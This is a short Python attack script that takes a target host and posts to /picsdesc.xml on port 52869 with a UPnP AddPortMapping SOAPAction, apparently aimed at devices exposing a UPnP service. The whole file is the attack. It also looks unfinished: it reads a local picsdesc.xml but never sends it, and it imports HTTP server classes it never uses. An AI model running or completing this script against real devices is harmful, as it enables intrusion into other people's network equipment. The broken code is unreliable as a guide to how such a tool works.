import argparse
import requests
from http.server import HTTPServer
from http.server import BaseHTTPRequestHandler
import sys
import time


def main():
    ap = argparse.ArgumentParser()
    ap.add_argument("--host", required=True, help="target host")
    ap.add_argument("-p", "--port", help="target port", default=52869)
    args = ap.parse_args()
    host = args.host
    port = args.port

    print(f"[*] Attacking {host} on port {port}")
    attack(host, port)


def attack(host, port):
    url = f"http://{host}:{port}/picsdesc.xml"
    headers = {
        "Accept-Encoding": "gzip, deflate",
        "SOAPAction": "urn:schemas-upnp-org:service:WANIPConnection:1#AddPortMapping",
        "Accept": "*/*",
        "Connection": "keep-alive"
    }
    data = open("./picsdesc.xml", "r").readlines()
    response = requests.post(url, headers=headers)
    print(response.status_code)
    pass


if __name__ == '__main__':
    main()
